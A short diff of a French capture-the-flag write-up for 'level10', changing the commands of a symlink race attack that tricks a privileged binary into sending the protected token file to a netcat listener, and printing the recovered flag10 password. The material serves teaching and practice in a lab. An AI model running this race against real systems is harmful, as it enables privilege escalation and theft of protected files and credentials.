@@ -64,12 +64,12 @@ On lance `tmux` ou tous simplement 3 instance `ssh`.
 
 ```sh
 # Instance 1
-while true; do ./level10 tata 127.0.0.1; done
+while true; do ./level10 /tmp/tata 127.0.0.1; done
 
 # Instance 2
 nc -kl 6969
 
 # Instance 3
-ln -sf /dev/null tata; sleep 0.1; ln -sf token tata
+ln -sf /dev/null /tmp/tata; sleep 0.1; ln -sf ~/token /tmp/tata
 ```
 Et sur l'instance 2 on recoit donc le contenu de token qui est le mot de passe de flag10. `woupa2yuojeeaaed06riuj63c`
